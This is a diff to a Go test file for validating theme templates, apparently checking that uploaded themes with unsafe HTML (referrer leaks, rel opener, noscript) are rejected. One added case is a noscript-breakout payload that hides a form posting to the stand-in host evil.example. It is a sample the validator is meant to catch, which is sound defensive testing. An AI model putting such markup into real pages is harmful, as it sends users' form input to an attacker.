@@ -421,7 +421,8 @@ func TestThemeValidation(t *testing.T) {
 		// The referrer.
 		{"referrerpolicy", zipOf(t, "tiny", base, homeWith(`<a href="https://example.com/" referrerpolicy="unsafe-url">x</a>`)), "template.referrer"},
 		{"meta referrer", zipOf(t, "tiny", base, homeWith(`<meta name="referrer" content="unsafe-url">`)), "template.referrer"},
-		{"meta referrer in noscript", zipOf(t, "tiny", base, homeWith(`<noscript><meta name="Referrer" content="unsafe-url"></noscript>`)), "template.referrer"},
+		{"noscript", zipOf(t, "tiny", base, homeWith(`<noscript><meta name="Referrer" content="unsafe-url"></noscript>`)), "template.element"},
+		{"noscript hiding a form", zipOf(t, "tiny", base, homeWith(`<noscript><a title="</noscript><form action=//evil.example>">x</a></noscript>`)), "template.element"},
 		{"meta named by an action", zipOf(t, "tiny", base, homeWith(`<meta name="{{.Title}}" content="unsafe-url">`)), "template.meta-name"},
 		{"rel opener", zipOf(t, "tiny", base, homeWith(`<a href="https://example.com/" target="_blank" rel="noreferrer opener">x</a>`)), "template.rel"},
 		{"rel from an action", zipOf(t, "tiny", base, homeWith(`<a href="https://example.com/" rel="{{.Title}}">x</a>`)), "template.rel"},
